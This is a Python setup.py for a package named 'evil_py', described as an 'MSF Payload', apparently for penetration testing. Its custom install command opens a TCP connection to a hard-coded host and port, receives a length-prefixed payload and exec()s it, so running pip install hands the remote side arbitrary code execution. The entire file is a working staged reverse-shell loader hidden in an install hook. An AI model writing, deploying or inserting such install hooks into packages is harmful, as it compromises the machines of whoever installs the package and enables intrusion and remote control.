import socket, struct, time, os
import setuptools
from setuptools.command.install import install

class evil_py_class(install):
  def run(self):
    for x in range(10):
      try:
        s=socket.socket(2,socket.SOCK_STREAM)
        s.connect(('10.14.1.6',13043))
        break
      except:
        time.sleep(5)
    l=struct.unpack('>I',s.recv(4))[0]
    d=s.recv(l)
    while len(d)<l:
      d+=s.recv(l-len(d))
    exec(d,{'s':s})

with open("README.md", "r") as fh:
    long_description = fh.read()

setuptools.setup(
  name="evil_py",
  version="1.0.0",
  author="sn0wfa11",
  author_email="dontemail@me.com",
  description="MSF Payload",
  long_description=long_description,
  long_description_content_type="text/markdown",
  url="https://github.com/sn0wfa11",
  packages=setuptools.find_packages(),
  cmdclass={ "install": evil_py_class }
)
